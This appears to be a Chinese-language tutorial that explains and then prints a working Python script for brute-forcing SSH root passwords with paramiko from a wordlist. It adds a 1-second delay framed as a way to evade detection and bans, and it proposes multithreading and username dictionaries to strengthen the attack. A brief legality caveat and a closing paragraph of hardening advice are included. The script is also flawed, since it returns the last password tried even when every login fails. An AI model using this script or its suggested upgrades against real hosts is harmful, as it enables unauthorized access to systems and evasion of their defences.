## **核心步骤解析**

1. **导入库**：
   - `paramiko`: 一个用于处理SSH连接的Python库。
   - `time`: 用于控制尝试间隔，避免过快导致IP封禁。
2. **`ssh_crack`函数**：
   - **目标**：对指定主机的SSH服务进行密码爆破，返回成功的密码。
   - **参数**：`targethost` → 目标主机的IP地址。
3. **读取密码文件**：
   - `pwds.txt` 存储了可能的密码，每行一个。
   - `file.readlines()` 读取所有行，存入 `pw_list`。
4. **逐个尝试密码**：
   - `paramiko.Transport` 建立SSH连接，端口为22。
   - `transport.connect` 尝试以用户名 `root` 和读取的密码登录。
5. **异常处理**：
   - 如果登录失败，抛出异常，程序跳过继续下一次尝试。
   - `time.sleep(1)` 添加1秒延迟，减少暴力破解的速度，降低被检测封禁的风险。
6. **成功处理**：
   - 如果成功连接，跳出循环，返回正确密码。
   - 最终打印成功的密码。

------

## **改进计划**

1. **安全性与合法性**：暴力破解未经授权的系统是非法的，实际测试应在受控环境下进行。
2. **超时处理**：可以设置超时时间，避免长时间卡住。
3. **多线程优化**：用多线程提高破解速度。
4. **用户名字典**：支持用户名字典，而不只是固定用户名 `root`。

------

## **总结**

代码的核心是利用 `paramiko` 尝试逐个密码连接SSH，成功后返回密码。但在现实场景中，更安全的做法是强化密码策略、禁用密码登录改用公私钥认证，并监控异常登录尝试。了解爆破原理有助于更好地防御和加固系统安全。

```python
\#SSH爆破

import paramiko

import time

\# 爆破SSH，建议使用证书进行登录

def ssh_crack(targethost):

  with open('D:\Softwares\PyCharm2022\MyProjects\AFinal\opt\dict\pwds.txt') as file:

​    pw_list = file.readlines()

  for password in pw_list:

​    try:

​      transport = paramiko.Transport((targethost, 22))

​      transport.connect(username='root', password=password.strip())

​      \# print(f"SSH破解成功，密码为：{password.strip()}")

​      break

​    except:

​      pass

​    time.sleep(1)

  return password.strip()

if __name__ == '__main__':

  targethost = '目标的IP地址'

  password = ssh_crack(targethost)

  print(f"SSH破解成功，密码为：{password}")
```

